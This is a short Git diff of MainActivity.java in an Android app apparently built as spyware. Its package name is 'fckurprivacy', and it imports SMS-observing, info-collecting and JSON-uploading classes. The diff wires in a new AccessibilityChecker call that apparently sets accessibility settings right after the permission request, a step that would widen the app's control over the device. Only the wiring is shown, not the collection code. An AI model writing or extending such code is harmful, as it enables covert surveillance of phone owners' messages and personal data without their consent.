@@ -19,6 +19,7 @@ import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsChecke
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
+import com.vergermiya.harevost.fckurprivacy.Util.AccessibilityChecker;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonUploader;
 
@@ -153,6 +154,8 @@ public class MainActivity extends AppCompatActivity {
         if (mPermissionsChecker.lacksPermissions(PERMISSIONS)) {
             startPermissionsActivity();
         }
+
+        AccessibilityChecker.setAccessibilitySetting(MainActivity.this);
     }
 
     private void startPermissionsActivity() {
@@ -166,7 +169,6 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == REQUEST_CODE && resultCode == PermissionsActivity.PERMISSIONS_DENIED) {
             finish();
         }
-
         InfoChecker.saveInfoJson(this);
     }
 
